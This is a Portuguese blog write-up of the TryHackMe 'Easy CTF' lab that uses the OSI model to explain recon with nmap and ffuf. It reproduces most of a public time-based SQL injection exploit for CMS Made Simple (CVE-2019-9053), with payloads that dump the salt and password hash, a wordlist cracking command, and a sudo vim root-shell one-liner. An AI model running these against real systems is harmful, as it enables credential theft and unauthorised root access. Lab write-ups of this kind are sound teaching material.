![Easy CTF](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b5b4tjc884gh02rtrt0b.jpeg)
# Easy CTF - Uma breve jornada de exploração com base no modelo OSI
Quando se está estudando sobre fundamentos de redes, entendendo sobre o modelo OSI, arquitetura TCP/IP e etc., na mente fica o grande questionamento de como assimilar esses conceitos no cotidiano ou pelo menos de uma forma clara sobre seu funcionamento . E é por isso que esse texto irá trabalhar com essa assimilação usando a máquina [**Easy CTF**](https://tryhackme.com/r/room/easyctf), uma simples lab, que nesse momento irá ajudar a trabalhar um pouco sobre como operam as camadas e as interações que ocorrem entre elas no modelo OSI.

Antes de iniciar com a máquina, alguns conceitos precisam ser relembrados, ainda que de maneira breve, mas para reforçar o que se propõe esse pequeno laboratório.


## Introdução à Rede de Computadores
Rede de computadores são basicamente dispositivos interligados que trocam informações entre si. Nesse sentido, a rede é construída por dois aspectos principais: Conexão física e Conexão Lógica.
* Conexão Física: A infraestrutura física que realiza a conexão dos dispositivos. Exemplos: cabos, fios, roteadores, etc.
* Conexão Lógica: Aqui seria o caminho que é estabelecido entre esses dispositivos para que ocorra essa comunicação, o transporte desses dados. Nesse aspecto, não é dependente dessa infraestrutura física, porque é com os dispositivos são configurados que ocorre essa comunicação entre si. Exemplos: protocolos, endereços IP, etc.

Para que essa comunicação ocorra é necessário regras, de maneira mais direta: **protocolos**. Seria uma completa bagunça se não houvessem convenções e regras para definir como o seu dispositivo se comunique, por exemplo, com o servidor da **Google** e fosse possível acessar a página principal. Então, é fundamental o formato, sequência, como os dados são trocados, etc, para que seja possível processar as informações corretamente, de maneira eficiente e sem erros. Alem disso, existem diversos tipos de redes, que são classificados de acordo com o alcance geográfico e arquitetura, como por exemplo: LAN (Local Area Network) que seria uma rede pequena, mais local, como casa, escritório, etc., e  MAN (Metropolitan Area Network) uma rede maior que a LAN para  campus universitário, cidade, etc.

Em rede de computadores existem dois modelos bastante comuns de comunicação: Peer-to-Peer (P2P) e Client-Server. Existem outros, mas não serão o foco.
### Peer-to-Peer (P2P)
No modelo ponto a ponto os dispositivos da rede possuem funções iguais.  Cada um pode atuar como cliente ou como servidor Não se tem um controle centralizado sobre os recursos que são compartilhados e qualquer dispositivo pode compartilhar seus recursos. Exemplo: Torrent.

### Client-Server
No modelo cliente-servidor a rede é construída entre cliente e servidores. No qual, o cliente (computador) solicita um tipo de serviço ou recurso ao servidor. Exemplo disso é o ato de navegar pela web.


## Modelo OSI

![OSI Model](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8jszegsha9kwh9wcrg6g.png)
O modelo OSI (Open Systems Interconnection) é um modelo conceitual com propósito de compreender como ocorre a comunicação em rede de computadores e é dividida em 7 camadas:
* **Camada 1 - Física** tem o objetivo de realizar a transmissão física de dados através de cabos e sinais elétricos. Exemplos: Conexões fibra óptica e Cabos Ethernet.
* **Camada 2 - Enlace** seria o fiscal da transmissão desses dados, para que não ocorra erros entre os dispositivos conectados. Exemplos: Ethernet e Wi-Fi.
* **Camada 3 - Rede** é como o remetente e o destinatário, através do endereço de IP determina o caminho que os dados seguem entre os dispositivos. Exemplos: Protocolos IP e Roteadores.
* **Camada 4 - Transporte** como o próprio nome diz é o que garante o envio e o recebimento desses dados da camada três. Exemplos: TCP e UDP.
* **Camada 5 - Sessão** tem como função estabelecer e também encerrar a conexões entre aplicações. Exemplos: SSH e SCP.
* **Camada 6 - Apresentação** realize a formatação dos dados, para que possa ser compreendida pela camada superior. Exemplos: SSL/TLS e JPEG.
* **Camada 7 - Aplicação** oferece serviços e as interfaces para as aplicações dos usuários. Essa é a camada mais próxima do usuário. Exemplos: HTTP e HTTPS.
O proposito desse modelo é ajudar na padronização, ser uma referência teórica e contribuir para o entendimento sobre a interação entre os componentes de uma rede e assim facilitando a resolução de possíveis problemas.


## Início da jornada
### Reconhecimento 
O reconhecimento inicial é o passo mais importante, porque assim terá não só conhecimento sobre o alvo, mas também a maneira como será operado os primeiros passos para suceder um comprometimento inicial e acesso a informações importantes. Para além disso, é a etapa que sempre estará presente, mesmo após obter sucesso, sempre haverá um novo reconhecimento para ser feito de acordo com a elevação dos passos dados pelo invasor. Além disso, reconhecimento foi bastante retratado no texto [**Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque**](https://dev.to/obtuosa/maquina-valley-do-tryhackme-e-o-ciclo-de-vida-de-um-ciberataque-mp6).

Como já foi trabalhado de maneira breve sobre o que seria a camada 7, este é o primeiro contato com o alvo e é a camada mais próxima do usuário. A primeira visão dada é de uma página padrão do Apache2, apesar de não ter um conteúdo mais personalizado no que tange ao front-end é possível retirar algumas informações sobre esse servidor web, que utiliza o protocolo HTTP, nesse caso já teria uma possível falha, pois as solicitações e respostas são HTTP, ou seja, essas comunicações são realizadas em texto simples e não existe uma criptografia do que está sendo solicitado, algo que os protocolos de segurança TLS/SSL ajudariam bastante e apesar serem protocolos característicos da Camada de Apresentação, também é implementado em conjunto com os protocolos da Camada de Aplicação.
Outro ponto interessante é a estrutura do Apache apresentada:
* O arquivo principal presente no diretório: /etc/apache2/apache2.conf. 
* A configuração de portas: /etc/apache2/ports.conf.
* Além de diretórios para os módulos,configurações globais, etc.

![Apache2 Ubuntu Default Page](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/f501b5xwnyz3eqjok3do.png)
Nesse processo duas ferramentas foram muito importantes, o primeiro é o **nmap**, para o escaneamento de portas, e o segundo é o **ffuf** para buscar diretórios.

### Nmap
O escaneamento de portas com a ferramenta Nmap envolve três camadas importantes. O primeiro, pensando na perspectiva do usuário é de aplicação, porque a flag  **-sV** realiza uma interação com a camada 7, pois o nmap envia pacotes específicos para interagir com os protocolos dessa camada e assim possibilitar a identificação das informações necessárias sobre esses serviços em execução. Enquanto na camada de Transporte, esse processo de escaneamento utiliza protocolo TCP, a ideia é compreender como essa comunicação de identificação de serviços funcionam e o conceito por trás dos protocolos, pois é através dessa entrega de pacotes e as informações fornecidas, que é possível reconhecer as portas que estão abertas. Na camada de Rede,  essa troca acontece com o endereço IP, para que possa ser enviado esses pacotes ao servidor web alvo.
Além disso, você consegue obter duas respostas para as duas primeiras perguntas do desafio do Simple CTF:
* How many services are running under port 1000?
* What is running on the higher port?

![Nmap](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/o6dqt7o6mcsojuxkz81f.png)
```bash
nmap -v -sV -p 1-3000 [IP-ALVO]
```
#### ffuf
O ffuf tem foco principal na camada de aplicação, porque utiliza do protocolo HTTP ou HTTPS para realizar requisições ao servidor web e assim encontrar diretórios ou arquivos, mas não é uma exclusividade esse foco com a camada de aplicação, pois o mesmo também interage com outras camadas, para que assim ocorra seu funcionamento e vasculhar por qualquer vestígio de informações. Com ele é possível encontrar o diretório **/simple** e ter acesso a informações sobre o  **CVE 2019-9053** que é o estopim para ter um comprometimento inicial do servidor web. Mas, vale lembrar que as requisições HTTP do ffuf dependem do protocolo TCP, ou seja, temos aqui mais uma vez a camada de transporte presente, porque é estabelecida uma conexão confiável entre o cliente-servidor. Caso essa conexão fosse realizada pelo protocolo UDP, seria um problema, pois o mesmo não tem a garantia de entrega dos dados que são enviados. Assim como no nmap, o endereço IP também é usado para endereçar os pacotes que são enviados ao servidor e de encontro com a camada de rede. 

![ffuf](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mbz84puuimbg30sreymh.png)

### Diretório /simple
No diretório **/simple** é possível observar que utiliza o **CMS Made Simple**(CMSMS) para gerenciar o conteúdo, basicamente o objetivo é criar e gerenciar os sites da web de maneira mais simples e eficiente. No entanto, o fato de não atualizarem o sistema impactou diretamente na segurança do website e com uma busca simples pelo google é possível encontrar o [**CVE 2019-9053**](https://nvd.nist.gov/vuln/detail/CVE-2019-9053). CVE é um sistema de padronização que possibilita identificar e catalogar vulnerabilidades e exposições de segurança e é através desse catálogo que é possível encontrar um exploit no [**exploit-db**](https://www.exploit-db.com/exploits/46635), que é basicamente um repositório público de exploits para acessar vulnerabilidades.

![CMS Made Simple](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tybcbzi1eybpb9ccomfi.png)

![Exploit-db](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xvf5aeyegkw8l3szkobi.png)
Esse exploit é um SQL Injection que coloca comandos maliciosos em uma consulta do banco de dados SQL e poder manipular para ter acesso a principalmente credenciais, além das possibilidades de alterar as informações presentes naquele banco de dados, realizar escalonamento de privilégios, criação de novos usuários e diversas possibilidades. Esse exploit afeta justamente versões abaixo do 2.2.10 do CMS Made Simple.

---
### Exploit 46635.py
### Módulos
```python
import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib
```
Este exploit utiliza de alguns módulos para que possa ter um bom funcionamento:
1. **requests**: O objetivo desse módulo é permitir mais praticidade para enviar pedidos HTTP/1.1. 
2. **colored** e **cprint**: O termcolor tem o propósito de realizar uma formatação de cores ANSI para o output do terminal. O que torna a interface mais agradável.
3. **time**: Este módulo fornece as diversas funções relacionadas ao tempo. 
4. **optparse**: Uma biblioteca que lida com as linhas de comandos necessárias para realiza configurações desse exploit.
5. **hashlib**: Essa lib tem principal foco calcular as hashes.

### Definição de Argumentos do Parser
```python
parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
```

Com o fato lidar com as linhas de comandos que serão configuradas em prol ao exploit, o optparse.OptionParser() define os argumentos que o usuário poderá passar para o script. O -u para url, -w para a seleção da wordlist que será usada para quebrar a senha e  o -c para que seja ativada essa quebra de senha.
Essa configuração do url alvo constrói uma conexão com a Camada de Aplicação, quando se está determinando qual o endpoint que será explorado.
### Validação do URL
```python
if not options.url:
    print "[+] Specify an url target"
    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
    exit()
```
Após a definição dos argumentos do Parser é realizada uma verificação, caso a url passada pelo usuário seja válida. Se for inválida, é lançado no output do terminal um script com instruções de ajuda e finaliza a execução do exploit, porque é necessário que esses dados estejam corretos, para que a conexão HTTP ocorra, garantindo a Camada de Aplicação o recebimento das informações adequadamente.
### Variáveis
```python
url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
```

Nesse estágio do exploit são definidas as variáveis que constituem o ataque:
* **url_vuln**: O alvo do ataque que são a url principal e o endpoint vulnerável. Consequentemente é definido o recurso no servidor web alvo que será possivelmente acessado e também explorado. Além disso, são feitas requisições HTTP, que atuam na camada de aplicação.
* **session**: É criada uma sessão HTTP, que mesmo após o servidor processar a requisição e enviar de volta a resposta, a mesma não é fechada e garante ao cliente uma nova requisição. A camada de sessão se faz presente para que seja possível gerenciar a persistência dessas conexões HTTP.
* **dictionary**: São os caracteres que serão usados para a força bruta. Através desses conjuntos de caracteres usados nesse processo de força bruta terá uma estrutura específica, tanto hexadecimal, para que seja possível gerar os payloads do SQL Injection, quanto hash MD5 e as senhas possam ser comparadas durante a quebra. Portanto, ocorre uma manipulação e também conversão dos dados, no qual a camada de apresentação lida, ou seja, transformando esses formatos de dados entre o sistema e a rede.
* **flag**: Variável utilizada em relação a controle, para que ao ser usada em loops possa determinar se o processo da extração de dados deve continuar ou não.
* **password**:  Tem como objetivo armazenar a senha que será extraída do banco de dados no processo de SQL Injection. Dentro dessa perspectiva, esse campo também retrata uma etapa da apresentação quanto as possibilidades da senha ser convertida para diversos formatos e ser autenticada e quando isso ocorre se torna parte das credenciais usadas para o acesso de sistema do alvo, por parte da aplicação.
* **temp_password**: É um campo temporário que busca construir e também testar as possíveis combinações de caracteres das hashes no processo de extração da senha. Esses valores são justamente manipulados e também testados contra a url vulnerável do servidor web.
* **TIME**: Define o atraso em segundos que serão necessários para que seja validado o SQL Injection. Caso o tempo de resposta seja maior do que a definida, isso irá indicar que o payload foi realizado.
* **db_name**: Armazenamento de nome de usuário do banco de dados obtido através do SQL Injection. Mais uma vez a camada de apresentação se faz presente por se tratar de um dado que pode ser convertido para diversos formatos durante a extração e apresentação, alem de ser uma informação da aplicação alvo.
* **email**: Armazenamento do e-mail capturado do banco de dados do servidor web  e por consequência também pode ser formatado ou validado antes de ser exibido na apresentação desse dado.
* **salt**: É um valor utilizado para proteger as senhas no banco de dados. É necessário tentar extrair esse valor, para que seja possível realizar ataques de força bruta nas senhas. Como resultado, é parte da apresentação por ser manipulado e processado em formato hash MD5, antes de ocorrer a comparação ao hash das senhas armazenadas.
* **wordlist**: Essa variável armazena o diretório/caminho fornecido pelo usuário para um arquivo com uma lista de palavras que serão usadas como possíveis senhas e testadas em comparativo com a hash da senha combinado em conjunto com o salt. Essas palavras que serão listadas são processadas e também manipuladas, pois são relacionadas ao salt e após isso convertidas para hashes MD5, antes de serem de fato comparadas com a hash da senha armazenada.

```python
if options.wordlist:
    wordlist += options.wordlist
```
É importante ressaltar que essa condição apresentada acima após a definição das variáveis verifica se o usuário forneceu um caminho para o o arquivo de wordlist através do argumento definido pelo **optparse**. Caso tenha sido passado, o mesmo é adicionado a variável wordlist e a mesma passa a ter o diretório completo do arquivo que será usado para força bruta.
### Função crack_password
```python
def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    dict.close()
```
Essa função basicamente lê a wordlist linha por linha e também combina cada entrada com o salt do banco de dados. Desse modo, também gera o hash MD5 para que seja possível comparar com a senha encontrada no banco de dados. Logo, esse processo é uma manipulação de dados criptográficos presente na apresentação.

### Função dump_salt
```python
def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt
```
A função dump_salt realiza o processo de construção dos payloads SQL de maneira repetida para que seja possível capturar o salt, pois sem o salt não é possível conseguir as credenciais. Tanto que nesse momento, pode ser visto bem a interação por parte da camada 6, porque ocorre manipulação dos caracteres com a função hex(), em conjunto com a ord() e o envio 
desses payloads HTTP para a camada de aplicação.
Uma questão importante é que o mesmo processo acontece nas outras funções, como a **dump_password**, **dump_username** e **dump_email**. A construção dos payloads, que é gerada por cada função em busca de um valor específico, a requisição de envio, que é justamente o mesmo endpoint, para obter as informações dessa aplicação vulnerável. Um ponto interessante é como a camada de apresentação faz a manipulação desses dados para os formatos necessários, seja de conversão para hexadecimal e construir os payloads, quanto o ato de unir esses caracteres e refazer essas informações que foram obtidas.

Por fim, para que seja possível iniciar esse exploit é necessário o python2:
```bash
curl https://bootstrap.pypa.io/pip/2.7/get-pi.py -o get-pip.py

python2 get-pip.py

python2 -m pip --version 

python -m pip install requests
python2 -m pip install --upgrade pip setuptools
python2 -m pip install termcolor

python2 exploit.py -u "http://IP/simple" -c -w /usr/share/wordlists/dirb/rockyou.txt
```

## Comprometimento 
### SSH
O Secure Shell (SSH) é um protocolo que utiliza criptografia para que seja possível estabelecer conexões remotas de forma segura entre computadores.

![SSH Authentication](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yel1s1xx395g8roop083.png)
A ideia principal é entender o funcionamento do protocolo SSH durante a invasão. O primeiro ponto é estar principalmente na camada de aplicação, por ser um protocolo criado para que essas conexões ocorram de maneira mais segura ao acessar o servidor web do alvo via SSH, existem dois pontos importantes: A **autenticação**, no caso do usuário Mitch e a **sessão remota**, que é o acesso ao sistema operacional no servidor, que no caso é Ubuntu (Linux), com isso é possível usar comandos, executar processo, etc. 
O protocolo SSH perpassa também outras camadas como a de transporte, para que seja possível uma conexão confiável entre cliente e servidor, assim o protocolo TCP se faz presente mais uma vez. A camada de Rede em virtude do protocolo IP, que já foi visto anteriormente e o de **enlace**, porque o protocolo depende dessa camada para que os dados sejam enviados corretamente entre os dispositivos físicos na rede, **algo como "encapsulamento" desses dados, mas não um encapsulamento em definitivo**. 

Quanto ao processo do alvo até a flag existem três pontos legais: 
* Além do Mitch, existem um segundo usuário que é a resposta para o: Is there any other user in the home directory? What's its name?
* A captura da primeira flag **user.txt**.
* Com o comando **sudo -l** é possível mostrar os privilégios do usuário atual, no caso do Mitch e o mesmo pode executar o comando vim no diretório **/usr/bin** com o máximo de privilégio no sistema. É através desse comando que se tem a resposta para o: What can you leverage to spawn a privileged shell?. E em consequência a elevação de privilégios e acesso a última flag.

## Elevação de privilégios
Por fim, para realizar e ter acesso a última flag é basicamente utilizar o comando de acesso ao vim e já incrementando uma opção que possa viabilizar a execução do comando **bash** e ter acesso ao servidor web como root.
```bash
sudo /usr/bin/vim -c ":!bash"
```

![Privilege Escalation](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n1tjc31ljx1zw93f3ybm.png)
Portanto, foi possível ter acesso ao root e a última flag dessa máquina e mantendo assim um ciclo de ataques, numa perspectiva mais simples de um invasor.  Algo que já foi construído no texto mencionado mais acima: [**Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque**](https://dev.to/obtuosa/maquina-valley-do-tryhackme-e-o-ciclo-de-vida-de-um-ciberataque-mp6)
## Conclusão
O princípio maior dessa máquina foi justamente ter um pouco de compreensão da interação entre as camadas , com foco no modelo OSI e observar o funcionamento, para além dos conceitos já existentes. Desde a camada de aplicação, no qual é o mais próximo do cliente e assim destrinchar os caminhos traçados, seja com ferramentas como nmap e ffuf, além de protocolos como IP, TCP, SSH e outros conceitos que foram abordados no decorrer do processo. Muitas vezes, nos prendemos a teoria e deixamos de lado a parte prática, que é justamente um fator importante para o processo de aprendizado.
Te vejo na próxima jornada!